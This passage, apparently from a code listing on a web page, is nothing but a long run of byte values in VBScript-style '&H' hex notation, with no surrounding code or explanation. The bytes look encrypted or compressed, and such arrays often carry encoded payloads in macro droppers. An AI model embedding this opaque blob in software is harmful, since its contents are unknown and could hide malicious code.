4&amp;H5C&amp;H53&amp;HC8&amp;H4C&amp;H42&amp;H80&amp;H18&amp;H99&amp;H51&amp;HCD&amp;HAF&amp;H28&amp;H69&amp;HE9&amp;HBF&amp;H99&amp;H4F&amp;H21&amp;HCA&amp;HE3&amp;H00&amp;H25&amp;H2E&amp;H1A&amp;H14&amp;HD1&amp;H5A&amp;H4A&amp;H89&amp;H4D&amp;H3E&amp;H7A&amp;H8E&amp;HAA&amp;H86&amp;HCA&amp;HE6&amp;H40&amp;HEB&amp;H0E&amp;H9F&amp;H84&amp;HCD&amp;HE2&amp;H52&amp;H06&amp;HE0&amp;H45&amp;HCF&amp;H8B&amp;H17&amp;H0F&amp;H6A&amp;H02&amp;HFD&amp;HF9&amp;H89&amp;H1D&amp;H16&amp;HA1&amp;H3C&amp;H64&amp;H68&amp;H8A&amp;HA3&amp;HC7&amp;HE2&amp;HDC&amp;H2F&amp;H76&amp;H7F&amp;H5E&amp;H6A&amp;HC1&amp;H7C&amp;H22&amp;H52&amp;H69&amp;H7D&amp;HEC&amp;H75&amp;H4D&amp;H7C&amp;H8E&amp;HB7&amp;HBA&amp;H07&amp;H63&amp;H7D&amp;HBC&amp;H84&amp;H7C&amp;HDF&amp;HC5&amp;H09&amp;HA4&amp;HCB&amp;HF3&amp;H58&amp;HB4&amp;H51&amp;HF2&amp;HF3&amp;HEC&amp;H28&amp;H38&amp;HDE&amp;HE3&amp;H06&amp;H7E&amp;H9E&amp;HB5&amp;HDB&amp;HC8&amp;H58&amp;HB5&amp;HF6&amp;H8E&amp;H3B&amp;HA0&amp;H98&amp;H1F&amp;HD8&amp;H88&amp;HC2&amp;H1E&amp;HA7&amp;HC3&amp;H4F&amp;HB4&amp;H9F&amp;H54&amp;H2A&amp;H96&amp;H10&amp;HF3&amp;HC1&amp;HF5&amp;H55&amp;H39&amp;H6F&amp;H9A&amp;HC7&amp;HAC&amp;HCD&amp;HDC&amp;H03&amp;H6D&amp;H6C&amp;HBD&amp;H79&amp;HFF&amp;H23&amp;H93&amp;H28&amp;HAC&amp;HE4&amp;HC1&amp;H93&amp;H07&amp;HFF&amp;HFE&amp;H0B&amp;H80&amp;HE9&amp;H33&amp;H32&amp;HC5&amp;H80&amp;H86&amp;H03&amp;H3E&amp;HE6&amp;HCF&amp;H36&amp;HC4&amp;H93&amp;HF3&amp;H11&amp;HEB&amp;HD9&amp;HE1&amp;H19&amp;H61&amp;H51&amp;H05&amp;H2B&amp;H57&amp;H0C&amp;H7D&amp;H66&amp;HDC&amp;H4B&amp;H97&amp;H8D&amp;H78&amp;H1D&amp;H68&amp;H6C&amp;H4F&amp;HF2&amp;HED&amp;H5D&amp;HCA&amp;H39&amp;HAD&amp;HDE&amp;H7D&amp;HAD&amp;HED&amp;H9F&amp;H9F&amp;H9F&amp;HD6&amp;H4F&amp;H76&amp;H91&amp;H08&amp;H2F&amp;H35&amp;HCB&amp;H6A&amp;H3C&amp;HCE&amp;H50&amp;H73&amp;H80&amp;HD1&amp;H45&amp;HC9&amp;H8A&amp;H4C&amp;H51&amp;H25&amp;HD0&amp;H30&amp;HCE&amp;H00&amp;HB6&amp;H9A&amp;H51&amp;H91&amp;H5E&amp;H2C&amp;H13&amp;H3C&amp;H94&amp;H6B&amp;H3B&amp;H27&amp;HCE&amp;HDE&amp;HBA&amp;HC3&amp;HF0&amp;HC8&amp;H34&amp;H42&amp;HDD&amp;HF4&amp;H32&amp;HCD&amp;H48&amp;HEB&amp;H35&amp;HEF&amp;HEA&amp;HDE&amp;H4A&amp;H96&amp;H95&amp;H8E&amp;H59&amp;H43&amp;H1C&amp;H72&amp;HD7&amp;H33&amp;H5F&amp;H4D&amp;HCC&amp;H24&amp;H81&amp;H49&amp;H1F&amp;HA8&amp;H5D&amp;HFF&amp;H92&amp;H6A&amp;HF1&amp;H54&amp;H98&amp;HC2&amp;H46&amp;H9E&amp;H0A&amp;HC2&amp;HB3&amp;H20&amp;HC8&amp;H47&amp;H82&amp;HD9&amp;HBD&amp;HD5&amp;HDE&amp;H5F&amp;H10&amp;HE9&amp;HF4&amp;HCA&amp;H68&amp;H71&amp;H31&amp;H84&amp;H61&amp;H4C&amp;HB6&amp;H05&amp;HF1&amp;H08&amp;H40&amp;H37&amp;H09&amp;HD7&amp;H5A&amp;H8B&amp;HAB&amp;H42&amp;H22&amp;HAD&amp;H97&amp;HD6&amp;H61&amp;H45&amp;H75&amp;HDD&amp;HCD&amp;HCB&amp;H1D&amp;HE7&amp;H29&amp;HC7&amp;H41&amp;H4C&amp;HEC&amp;H2E&amp;HAD&amp;HD4&amp;H05&amp;HA3&amp;HB9&amp;HE1&amp;H66&amp;H54&amp;H71&amp;HCD&amp;H4E&amp;H75&amp;HEB&amp;H2C&amp;HCF&amp;H58&amp;HF1&amp;H83&amp;H44&amp;HF6&amp;HBF&amp;HD4&amp;H82&amp;H4E&amp;HD6&amp;H0E&amp;H7B&amp;H39&amp;H72&amp;HF1&amp;H95&amp;HE1&amp;HA3&amp;H89&amp;H16&amp;H42&amp;H6D&amp;HF5&amp;H52&amp;H3D&amp;H6F&amp;H41&amp;HEF&amp;H53&amp;H27&amp;HAD&amp;HED&amp;H23&amp;H01&amp;H90&amp;HB1&amp;H2C&amp;HC6&amp;HD3&amp;H30&amp;HEA&amp;H4B&amp;HD8&amp;HC0&amp;HBA&amp;H15&amp;HAF&amp;HE2&amp;H6A&amp;HB7&amp;HD2&amp;H27&amp;H2C&amp;H7B&amp;H7F&amp;HA1&amp;H0A&amp;HB9&amp;HAA&amp;HC8&amp;H0C&amp;H7A&amp;HAA&amp;HB8&amp;HD9&amp;HA1&amp;H6C&amp;H9D&amp;H34&amp;H0B&amp;H3D&amp;H5A&amp;HE2&amp;HC7&amp;H3C&amp;H2F&amp;H33&amp;HEC&amp;H03&amp;HD1&amp;HDF&amp;HB8&amp;HD8&amp;HE8&amp;H0A&amp;H79&amp;H3C&amp;H34&amp;HD9&amp;H31&amp;HF8&amp;H59&amp;HC2&amp;H8D&amp;H1E&amp;HFE&amp;H2C&amp;H55&amp;HE8&amp;H5D&amp;H47&amp;H2E&amp;HC1&amp;H9D&amp;H1D&amp;HE6&amp;H4D&amp;HFB&amp;H60&amp;HBF&amp;HC7&amp;H05&amp;H9B&amp;H8D&amp;HAA&amp;H68&amp;H68&amp;HC6&amp;HB4&amp;H4D&amp;H63&amp;HD0&amp;H9F&amp;H82&amp;H02&amp;HA0&amp;H8F&amp;H12&amp;HFB&amp;H6A&amp;HD4&amp;H8B&amp;H25&amp;H10&amp;H6B&amp;H9C&amp;H63&amp;HB6&amp;HE0&amp;HDE&amp;HF1&amp;HF6&amp;H9A&amp;H70&amp;H4C&amp;H13&amp;HF9&amp;HA4&amp;HD5&amp;HB0&amp;HFB&amp;HB3&amp;H14&amp;H61&amp;H67&amp;H3D&amp;H9E&amp;HE6&amp;HA4&amp;HD2&amp;H51&amp;H61&amp;HD1&amp;H91&amp;H5A&amp;H64&amp;H7F&amp;H64&amp;H7D&amp;H3A&amp;HF6&amp;H17&amp;HE4&amp;HC3&amp;HF2&amp;HBE&amp;H77&amp;H80&amp;H57&amp;HE9&amp;H92&amp;H8C&amp;H98&amp;H08&amp;HBB&amp;H2D&amp;HFD&amp;HE5&amp;H4B&amp;H15&amp;HB8&amp;H1D&amp;H77&amp;H9F&amp;H13&amp;H74&amp;H11&amp;H42&amp;H35&amp;H9A&amp;H39&amp;H3D&amp;H07&amp;H3C&amp;H9E&amp;HFF&amp;H87&amp;H2E&amp;H76&amp;H75&amp;HA2&amp;H6D&amp;HEA&amp;H56&amp;H1B&amp;H32&amp;HF1&amp;HA6&amp;HD3&amp;HFE&amp;H20&amp;HBB&amp;H00&amp;H47&amp;H3D&amp;H87&amp;H1A&amp;H2F&amp;H43&amp;HDB&amp;H0A&amp;HD8&amp;H55&amp;HFF&amp;H84&amp;H14&amp;H40&amp;H37&amp;H84&amp;H94&amp;H68&amp;H4F&amp;H95&amp;H84&amp;H78&amp;H59&amp;H08&amp;HB2&amp;HF3&amp;H5E&amp;HC1&amp;HDF&amp;HB6&amp;H39&amp;HA5&amp;HAF&amp;H6B&amp;HCF&amp;HFA&amp;H71&amp;H30&amp;HAA&amp;H98&amp;HB6&amp;H22&amp;H21&amp;HB6&amp;H93&amp;H9E&amp;H82&amp;H24&amp;H03&amp;H9F&amp;H07&amp;HD8&amp;HEC&amp;H5B&amp;HCD&amp;HA7&amp;H79&amp;H87&amp;H14&amp;H48&amp;H32&amp;H04&amp;H3F&amp;HE4&amp;HEB&amp;H9C&amp;HA0&amp;H07&amp;H13&amp;H83&amp;HD7&amp;HDF&amp;HD8&amp;H86&amp;HEA&amp;HD8&amp;H1C&amp;H56&amp;H30&amp;H50&amp;HC7&amp;HC9&amp;H95&amp;H61&amp;HEA&amp;HF5&amp;HD7&amp;H0D&amp;H22&amp;HB0&amp;H7D&amp;HCA&amp;HC4&amp;H5A</span><br><span class="line">&amp;H66&amp;H37&amp;HEF&amp;H1F&amp;H35&amp;HA2&amp;H62&amp;HC1&amp;HC6&amp;H8E&amp;HA7&amp;HEA&amp;HEA&amp;H18&amp;H68&amp;H2C&amp;HCE&amp;H91&amp;HA9&amp;H55&amp;H55&amp;H2F&amp;H2D&amp;H02&amp;H5C&amp;HBB&amp;HDF&amp;HE2&amp;H39&amp;HD0&amp;H77&amp;H4D&amp;H44&amp;H4B&amp;H5C&amp;H1A&amp;H49&amp;HA6&amp;H24&amp;H55&amp;H99&amp;H09&amp;HBF&amp;HE4&amp;H79&amp;HD9&amp;HF5&amp;HF6&amp;H61&amp;HBC&amp;H17&amp;H09&amp;H85&amp;HE9&amp;HF8&amp;H16&amp;H2A&amp;H09&amp;HCC&amp;H0D&amp;H05&amp;H58&amp;HD1&amp;HD6&amp;HC4&amp;H56&amp;HD5&amp;H63&amp;H49&amp;HAB&amp;HAC&amp;HD6&amp;H5D&amp;HCA&amp;HFD&amp;H80&amp;HB9&amp;H46&amp;HF8&amp;H5C&amp;H69&amp;HDA&amp;H30&amp;HD8&amp;H79&amp;H35&amp;HB5&amp;HC4&amp;H32&amp;HAF&amp;H10&amp;H65&amp;HB5&amp;HBB&amp;H3C&amp;H33&amp;H70&amp;H1A&amp;H4B&amp;H1A&amp;HE2&amp;H04&amp;H33&amp;HFD&amp;H4C&amp;H72&amp;H41&amp;HE8&amp;HC8&amp;HEE&amp;H66&amp;HB0&amp;H82&amp;H2F&amp;H6F&amp;H62&amp;HF6&amp;HBC&amp;H51&amp;HD5&amp;HE3&amp;H83&amp;H8F&amp;H56&amp;H26&amp;H80&amp;H70&amp;H20&amp;HB3&amp;HFB&amp;H60&amp;H4C&amp;H7C&amp;H86&amp;H1B&amp;H66&amp;H7C&amp;HC4&amp;H84&amp;HA6&amp;H44&amp;HDA&amp;HCD&amp;HAB&amp;HFD&amp;HA6&amp;H11&amp;H9C&amp;HCB&amp;H1E&amp;H5A&amp;H37&amp;H1A&amp;HAC&amp;H94&amp;H9C&amp;H16&amp;H09&amp;H87&amp;HBA&amp;H66&amp;H80&amp;H5A&amp;HE6&amp;HFC&amp;H89&amp;H9D&amp;H84&amp;H33&amp;H58&amp;H67&amp;HBB&amp;H05&amp;H04&amp;HC5&amp;H9C&amp;H99&amp;H51&amp;H92&amp;HB7&amp;HDE&amp;H07&amp;H51&amp;H4F&amp;HE8&amp;HCA&amp;H7D&amp;H61&amp;H44&amp;H69&amp;HA5&amp;HA0&amp;HEB&amp;H42&amp;H22&amp;H8A&amp;H68&amp;H4B&amp;H3A&amp;HC5&amp;H62&amp;H72&amp;H0E&amp;H4A&amp;H55&amp;HFF&amp;HE5&amp;HEF&amp;H2A&amp;H03&amp;H5F&amp;HBC&amp;HD8&amp;H5C&amp;H25&amp;H74&amp;HC1&amp;H3A&amp;HE5&amp;HBC&amp;HC8&amp;H07&amp;H73&amp;HF4&amp;H94&amp;H86&amp;H7C&amp;HA1&amp;H1D&amp;HE9&amp;HA2&amp;HE4&amp;H87&amp;H45&amp;H4A&amp;HCD&amp;HA1&amp;H41&amp;H81&amp;H1A&amp;H60&amp;H21&amp;H0E&amp;HC1&amp;H98&amp;H7E&amp;H16&amp;H88&amp;H53&amp;H87&amp;HC4&amp;H39&amp;HB9&amp;H17&amp;H8D&amp;H8C&amp;H95&amp;HDF&amp;H92&amp;H85&amp;HAC&amp;H07&amp;H9C&amp;H24&amp;H53&amp;H2D&amp;H69&amp;H26&amp;HCD&amp;HB4&amp;HE0&amp;H8F&amp;HE8&amp;H4A&amp;H7F&amp;H56&amp;HFC&amp;H0A&amp;H19&amp;H30&amp;HC5&amp;HB5&amp;H26&amp;HDE&amp;HF9&amp;HCE&amp;H18&amp;H3F&amp;H20&amp;HC1&amp;H5B&amp;H02&amp;H6B&amp;H67&amp;H61&amp;HD4&amp;H5C&amp;H8E&amp;HC4&amp;HD0&amp;H86&amp;HCD&amp;HBB&amp;H5E&amp;H3C&amp;HF6&amp;H79&amp;HA3&amp;HEA&amp;H1C&amp;H3E&amp;HCB&amp;HBA&amp;H59&amp;H72&amp;HC2&amp;H42&amp;H1A&amp;H01&amp;HFF&amp;H69&amp;H7F&amp;HB7&amp;H00&amp;H11&amp;H6A&amp;H50&amp;H8E&amp;H1C&amp;H56&amp;H8D&amp;H05&amp;H6E&amp;H67&amp;HAF&amp;H16&amp;H8B&amp;H81&amp;H11&amp;H29&amp;HD8&amp;HF0&amp;H71&amp;H74&amp;HE4&amp;HC2&amp;HB0&amp;H3A&amp;HC8&amp;H9F&amp;H44&amp;H1F&amp;H49&amp;HCA&amp;HFB&amp;H9A&amp;H50&amp;H40&amp;HFE&amp;HCA&amp;H7C&amp;H05&amp;HB0&amp;H03&amp;HC1&amp;H6D&amp;H1B&amp;HA4&amp;H9F&amp;H5F&amp;HC1&amp;H52&amp;H44&amp;H55&amp;H37&amp;HCC&amp;H41&amp;H68&amp;H80&amp;HC7&amp;H01&amp;H8D&amp;HBC&amp;H9E&amp;H16&amp;H5B&amp;H2A&amp;HFF&amp;H4D&amp;HD3&amp;H69&amp;H6B&amp;HE8&amp;HA9&amp;H12&amp;HD9&amp;H9D&amp;H56&amp;H9F&amp;H5C&amp;H70&amp;HBE&amp;H95&amp;H56&amp;HD9&amp;H1E&amp;H7D&amp;HA2&amp;HC3&amp;HF0&amp;H99&amp;H48&amp;HDB&amp;H74&amp;HA7&amp;H59&amp;HF8&amp;H8C&amp;H46&amp;H1C&amp;HA3&amp;HC8&amp;HBD&amp;H9B&amp;H08&amp;HF3&amp;HE7&amp;HCC&amp;H51&amp;HE2&amp;H5E&amp;H83&amp;H20&amp;HB4&amp;H9B&amp;H43&amp;HB9&amp;H5E&amp;H60&amp;H6B&amp;H22&amp;H98&amp;HA9&amp;H3C&amp;H2B&amp;HBD&amp;HC2&amp;H56&amp;H7F&amp;H2F&amp;H9C&amp;H97&amp;H3F&amp;H36&amp;HEB&amp;H90&amp;HEA&amp;H66&amp;H67&amp;H70&amp;HC5&amp;HA1&amp;H40&amp;H0B&amp;H9A&amp;HBB&amp;H38&amp;HE5&amp;H06&amp;HCA&amp;HC6&amp;H9F&amp;HE7&amp;HC0&amp;H29&amp;H73&amp;H82&amp;H74&amp;HD2&amp;HDD&amp;H95&amp;HED&amp;HDA&amp;H79&amp;H3E&amp;H6A&amp;H6E&amp;H84&amp;H82&amp;H04&amp;HDD&amp;H75&amp;H77&amp;HFB&amp;H72&amp;HA5&amp;HCC&amp;HFB&amp;H17&amp;H2F&amp;H12&amp;H5D&amp;H73&amp;H0D&amp;H1C&amp;HC6&amp;H65&amp;HEC&amp;HDA&amp;HB4&amp;H83&amp;HC9&amp;H5A&amp;H9F&amp;H61&amp;HA5&amp;HE4&amp;HC9&amp;H99&amp;HE1&amp;H45&amp;H71&amp;H93&amp;H72&amp;H1B&amp;H56&amp;HCD&amp;H12&amp;H7B&amp;H89&amp;HD3&amp;H25&amp;H36&amp;H69&amp;HA8&amp;H07&amp;H9A&amp;HF5&amp;H11&amp;HFC&amp;HC6&amp;HAB&amp;H41&amp;H06&amp;H1C&amp;H22&amp;HB6&amp;H32&amp;HD9&amp;H8E&amp;H05&amp;H79&amp;H80&amp;H08&amp;H8C&amp;HA9&amp;H12&amp;H50&amp;H92&amp;HD0&amp;HC2&amp;H2F&amp;H47&amp;HF7&amp;HDB&amp;H1A&amp;HC9&amp;H45&amp;H3A&amp;HE0&amp;H86&amp;H3E&amp;H6F&amp;H04&amp;HAE&amp;HE3&amp;H67&amp;H0A&amp;HDC&amp;HDF&amp;H85&amp;HF9&amp;H7E&amp;HB7&amp;H80&amp;H11&amp;H0F&amp;HE6&amp;H5E&amp;HBD&amp;H47&amp;HDE&amp;H0E&amp;H49&amp;H51&amp;HAE&amp;H64&amp;H88&amp;H01&amp;H99&amp;HF0&amp;H07&amp;HD7&amp;H2D&amp;H5A&amp;HD4&amp;HB9&amp;HAE&amp;H11&amp;H11&amp;H18&amp;HC2&amp;HD7&amp;H46&amp;HA1&amp;H27&amp;H3E&amp;H6E&amp;H71&amp;HB4&amp;HCA&amp;H05&amp;HBD&amp;H4E&amp;HF9&amp;HC9&amp;H95&amp;HEB&amp;H91&amp;H48&amp;H09&amp;H27&amp;H45&amp;H19&amp;H74&amp;H00&amp;H42&amp;H3B&amp;HE6&amp;H8E&amp;HD5&amp;H05&amp;H14&amp;HCE&amp;H9B&amp;H5A&amp;HCE&amp;H34&amp;H2C&amp;H99&amp;HA3&amp;H49&amp;HE1&amp;HEC&amp;HB1&amp;H56&amp;H06&amp;H4E&amp;H0C&amp;H9F&amp;HC2&amp;H0B&amp;H90&amp;H8D&amp;H2C&amp;H41&amp;HAD&amp;H11&amp;HA7&amp;H31&amp;H84&amp;HB0&amp;HCA&amp;H98&amp;HFC&amp;H0E&amp;HAE&amp;HBC&amp;HF0&amp;HFB&amp;H6C&amp;H93&amp;HF7&amp;H86&amp;H2C&amp;H3A&amp;H01&amp;H2F&amp;H9A&amp;HD7&amp;H96&amp;HD3&amp;H71&amp;H9A&amp;HB7&amp;H12&amp;HDE&amp;HA6&amp;H9B&amp;HB6&amp;HAA&amp;HFF&amp;HE3&amp;H1F&amp;H74&amp;H4F&amp;H9C&amp;H12&amp;HB7&amp;H59&amp;HC6&amp;HB5&amp;HD3&amp;H5B&amp;HD4&amp;H13&amp;HF5&amp;HEF&amp;H66&amp;H72&amp;H3C&amp;H95&amp;HB1&amp;H38&amp;H1E&amp;H6D&amp;HC0&amp;H4B&amp;H65&amp;H76&amp;HEE&amp;H5C&amp;HAB&amp;HF5&amp;H89&amp;HEF&amp;HA7&amp;HE7&amp;H26&amp;HF6&amp;H89&amp;HD2&amp;H20&amp;HE5&amp;H0A&amp;H3F&amp;HF1&amp;H16&amp;H36&amp;H9A&amp;H59&amp;H09&amp;HA5&amp;HF4&amp;HA3&amp;H52&amp;H45&amp;H52&amp;H47&amp;HF1&amp;HF7&amp;H68&amp;H5D&amp;HA1&amp;HB2&amp;H30&amp;HB8&amp;H39&amp;H6F&amp;H93&amp;H17&amp;H83&amp;H5B&amp;HB3&amp;H0D&amp;H91&amp;HAA&amp;HC4&amp;HD9&amp;H08&amp;H1E&amp;H3C&amp;H22&amp;HA6&amp;H37&amp;HA2&amp;H48&amp;HF9&amp;H9E&amp;H01&amp;H67&amp;H13&amp;H23&amp;H2D&amp;H82&amp;H7F&amp;H5B&amp;H92&amp;H92&amp;H49&amp;H23&amp;H8C&amp;H7B&amp;H24&amp;H10&amp;H2D&amp;H90&amp;H32&amp;H82&amp;H00&amp;H83&amp;H09&amp;H6D&amp;H50&amp;HAC&amp;HF3&amp;H1C&amp;H43&amp;H73&amp;HD2&amp;H73&amp;HA2&amp;H52&amp;H6D&amp;H64&amp;HB4&amp;H00&amp;HF2&amp;H2E&amp;H59&amp;H3D&amp;HA9&amp;H46&amp;H4E&amp;H59&amp;H2C&amp;H9A&amp;H03&amp;H2E&amp;H11&amp;H57&amp;H4F&amp;H7F&amp;HE4&amp;H79&amp;HF1&amp;H57&amp;H12&amp;HC9&amp;H37&amp;H85&amp;H02&amp;H47&amp;H8F&amp;H49&amp;H19&amp;H7A&amp;H75&amp;H33&amp;H65&amp;H4D&amp;H21&amp;HF2&amp;H26&amp;H6A&amp;H3A&amp;HCA&amp;HBA&amp;H8D&amp;H7D&amp;HFA&amp;H55&amp;H20&amp;H66&amp;H7B&amp;HF5&amp;H4F&amp;H75&amp;H3A&amp;HF4&amp;H8A&amp;H40&amp;H7D&amp;H3B&amp;HE0&amp;H6A&amp;H06&amp;HF8&amp;HA3&amp;HAD&amp;H1A&amp;H57&amp;H05&amp;H77&amp;H06&amp;HF3&amp;H3A&amp;HCE&amp;HB9&amp;H44&amp;H8C&amp;H22&amp;HE6&amp;H62&amp;H93&amp;H60&amp;HAC&amp;H09&amp;HE7&amp;H11&amp;H7B&amp;H7E&amp;H41&amp;H28&amp;H2B&amp;H49&amp;H21&amp;H8A&amp;HB3&amp;H03&amp;HAA&amp;H7C&amp;H9B&amp;H12&amp;H35&amp;HDE&amp;H29&amp;HCA&amp;H2F&amp;H96&amp;H56&amp;H08&amp;HAA&amp;HE1&amp;H20&amp;H5C&amp;H18&amp;H05&amp;H13&amp;H26&amp;H43&amp;H7D&amp;HF2&amp;H89&amp;H15&amp;HE9&amp;H33&amp;H05&amp;H0A&amp;H54&amp;HBD&amp;H2E&amp;HA5&amp;H3F&amp;H06&amp;HD1&amp;HD3&amp;H12&amp;H95&amp;HF1&amp;H37&amp;H43&amp;HD1&amp;HF1&amp;H91&amp;H03&amp;H94&amp;H0D&amp;HF7&amp;HFA&amp;HDD&amp;H63&amp;H16&amp;H85&amp;HDB&amp;H8F&amp;HF0&amp;HD0&amp;H74&amp;HE0&amp;HA6&amp;HD4&amp;HF2&amp;H4A&amp;H60&amp;H55&amp;HD2&amp;H2F&amp;H4E&amp;H5E&amp;H8B&amp;H61&amp;H13&amp;HE8&amp;H84&amp;H28&amp;H70&amp;H6C&amp;HB9&amp;H1B&amp;H09&amp;H15&amp;H31&amp;HD8&amp;H4D&amp;H5A&amp;H7D&amp;H79&amp;H2A&amp;H01&amp;H47&amp;HD4&amp;HE4&amp;HB3&amp;HF2&amp;HED&amp;HDA&amp;H3B&amp;HFD&amp;HCD&amp;H74&amp;HEB&amp;H48&amp;H21&amp;H32&amp;HF7&amp;H67&amp;H48&amp;HAF&amp;H54&amp;H39&amp;HA6&amp;H8C&amp;H85&amp;H1B&amp;HA3&amp;H06&amp;H68&amp;H78&amp;HAD&amp;H20&amp;H1D&amp;H1C&amp;HD1&amp;H1D&amp;H2B&amp;H1B&amp;H6E&amp;HA2&amp;H26&amp;HBA&amp;H13&amp;H33&amp;H42&amp;HC1&amp;H2B&amp;H08&amp;H89&amp;H6A&amp;HD3&amp;H18&amp;H41&amp;H85&amp;H72&amp;HD0&amp;HDC&amp;H7C&amp;H87&amp;H31&amp;H2A&amp;H1F&amp;H4E&amp;H3C&amp;HCE&amp;H64&amp;HD1&amp;H14&amp;HF3&amp;H17&amp;HF9&amp;H09&amp;H79&amp;H26&amp;HB6&amp;H8F&amp;H23&amp;HAA&amp;H47&amp;H39&amp;HEA&amp;H69&amp;H1D&amp;H18&amp;HCE&amp;H00&amp;H97&amp;HF7&amp;H76&amp;H55&amp;H2A&amp;H58&amp;H4A&amp;H44&amp;HFC&amp;H81&amp;H79&amp;HA8&amp;HC4&amp;H82&amp;H75&amp;HCF&amp;H3B&amp;H59&amp;H67&amp;H9C&amp;HA1&amp;HD7&amp;HA7&amp;H48&amp;HEC&amp;H50&amp;HB5&amp;H6A&amp;HB4&amp;H6D&amp;HC8&amp;H54&amp;H27&amp;HD6&amp;H22&amp;HEB&amp;H34&amp;HA5&amp;H78&amp;HD9&amp;H4E&amp;HF1&amp;HD7&amp;H80&amp;HF4&amp;H72&amp;HB0&amp;HE8&amp;HD5&amp;H5B&amp;HA1&amp;H39&amp;HD7&amp;H79&amp;HB7&amp;H84&amp;H4A&amp;H9A&amp;H5B&amp;HEF&amp;HAE&amp;H32&amp;H75&amp;H05&amp;H8E&amp;H63&amp;H48&amp;H2D&amp;H9C&amp;HD1&amp;H62&amp;H85&amp;H50&amp;H0A&amp;H57&amp;H52&amp;H27&amp;H3A&amp;H0A&amp;H69&amp;H56&amp;HDC&amp;H0B&amp;HD7&amp;H0C&amp;H7C&amp;HE8&amp;HEE&amp;H3E&amp;H09&amp;H1F&amp;H14&amp;HD8&amp;HCE&amp;H2F&amp;H7D&amp;H0C&amp;H46&amp;H43&amp;H89&amp;H03&amp;H82&amp;HE4&amp;HA4&amp;HA0&amp;H53&amp;H02&amp;H0C&amp;HA5&amp;HEB&amp;H04&amp;H1E&amp;HFC&amp;H2F&amp;HE9&amp;H97&amp;HC2&amp;H29&amp;H37&amp;HF6&amp;H9B&amp;HBF&amp;H0A&amp;H44&amp;HBA&amp;HA2&amp;H31&amp;HEB&amp;H78&amp;H70&amp;H1A&amp;H8A&amp;HCD&amp;H20&amp;H90&amp;HE4&amp;HBF&amp;H08&amp;H1F&amp;H1C&amp;H2A&amp;H81&amp;H85&amp;H0C&amp;HB2&amp;HD4&amp;HA1&amp;HFC&amp;H26&amp;HB3&amp;HCB&amp;H7B&amp;HAA&amp;H89&amp;H05&amp;HD0&amp;H43&amp;HCB&amp;H13&amp;H5E&amp;H8F&amp;HA3&amp;H1A&amp;HD9&amp;HDE&amp;H9D&amp;H4B&amp;HA3&amp;H8D&amp;H6D&amp;HF3&amp;HAA&amp;HC2&amp;HAC&amp;HCE&amp;H40&amp;H6F&amp;H71&amp;H20&amp;HC8&amp;H18&amp;H15&amp;H07&amp;H94&amp;H28&amp;HD9&amp;HDD&amp;H8E&amp;HCF&amp;H86&amp;HB2&amp;HA1&amp;H34&amp;HEC&amp;H2C&amp;H0A&amp;HE5&amp;HF5&amp;H6A&amp;HC3&amp;HB9&amp;H35&amp;H14&amp;HE9&amp;H59&amp;HDA&amp;H36&amp;HCD&amp;H16&amp;H5C&amp;HE2&amp;HCB&amp;HB4&amp;H44&amp;H0B&amp;H81&amp;HA9&amp;H78&amp;H4E&amp;HF6&amp;HE3&amp;H83&amp;HD8&amp;HF2&amp;H06&amp;H6C&amp;HDE&amp;H3B&amp;H43&amp;HD4&amp;HF8&amp;H22&amp;H80&amp;H91&amp;H20&amp;H2A&amp;H86&amp;HE5&amp;H98&amp;HF5&amp;HCA&amp;HB6&amp;H04&amp;H10&amp;H2B&amp;HED&amp;H6E&amp;HEA&amp;H78&amp;HA4&amp;H64&amp;HF7&amp;H58&amp;HC5&amp;H3C&amp;H02&amp;H4E&amp;H53&amp;H85&amp;H35&amp;HBC&amp;H66&amp;HC7&amp;H39&amp;HC5&amp;HEA&amp;HD9&amp;H09&amp;H3D&amp;HFF&amp;H4B&amp;H69&amp;HA4&amp;H16&amp;H15&amp;H70&amp;H3F&amp;H62&amp;H80&amp;H28&amp;HED&amp;HC6&amp;H15&amp;H37&amp;HD0&amp;H6B&amp;HBE&amp;H0D&amp;H3D&amp;H92&amp;H45&amp;HB3&amp;H0A&amp;H88&amp;HA0&amp;HFA&amp;H7A&amp;HF3&amp;H38&amp;H4F&amp;H83&amp;H1C&amp;H7A&amp;HA6&amp;HE5&amp;H0B&amp;H18&amp;H33&amp;H0F&amp;H69&amp;H0B&amp;HDF&amp;H43&amp;H4B&amp;H49&amp;H78&amp;H16&amp;HB8&amp;HE8&amp;HE9&amp;H8F&amp;HDB&amp;H85&amp;H7D&amp;HB0&amp;HFE&amp;H13&amp;H13&amp;H87&amp;H84&amp;H59&amp;H82&amp;H70&amp;HEC&amp;H7C&amp;H5F&amp;H73&amp;HCA&amp;H82&amp;HFE&amp;H44&amp;H47&amp;HA1&amp;H05&amp;H1F&amp;H4C&amp;H2B&amp;HBA&amp;H37&amp;H18&amp;H5E&amp;H03&amp;H11&amp;HAF&amp;H9D&amp;HC8&amp;H0E&amp;H52&amp;H1D&amp;H28&amp;H50&amp;HAC&amp;HD9&amp;H96&amp;HB5&amp;H84&amp;H9B&amp;H9F&amp;H61&amp;H99&amp;HEE&amp;H62&amp;H23&amp;H6B&amp;HE4&amp;H69&amp;H25&amp;H79&amp;H11&amp;HC9&amp;HBC&amp;H9C&amp;HD8&amp;HE1&amp;H86&amp;HCC&amp;HAB&amp;HDC&amp;H25&amp;H26&amp;H40&amp;HF5&amp;H14&amp;H5A&amp;H70&amp;H85&amp;H81&amp;H73&amp;HBD&amp;H9F&amp;H97&amp;H94&amp;HE0&amp;H05&amp;H14&amp;H97&amp;H90&amp;H85&amp;H24&amp;H0A&amp;H24&amp;H45&amp;H0D&amp;H72&amp;H08&amp;H3F&amp;H8C&amp;H33&amp;H6B&amp;H9B&amp;H27&amp;H30&amp;HA8&amp;H11&amp;H0C&amp;HF2&amp;H4E&amp;H20&amp;H9A&amp;H74&amp;H68&amp;H68&amp;H57&amp;HA0&amp;HBA&amp;HE5&amp;HE7&amp;H7C&amp;HDC&amp;H0D&amp;HDB&amp;HC7&amp;H1B&amp;H09&amp;H48&amp;HB5&amp;H53&amp;H76&amp;HD0&amp;H4E&amp;H80&amp;HAE&amp;HAC&amp;HA7&amp;H28&amp;H03&amp;HC1&amp;H94&amp;H96&amp;HBF&amp;HD1&amp;HEA&amp;HC1&amp;H56&amp;HE9&amp;HC0&amp;H79&amp;H95&amp;H52&amp;HE6&amp;H0F&amp;H28&amp;H3C&amp;H25&amp;H34&amp;H56&amp;H15&amp;H8F&amp;HAE&amp;H8F&amp;H68&amp;H03&amp;H81&amp;H4C&amp;HE3&amp;H61&amp;H96&amp;H8C&amp;H0B&amp;H75&amp;HBD&amp;HC0&amp;H7E&amp;HF7&amp;H8B&amp;H13&amp;H49&amp;H5D&amp;H0B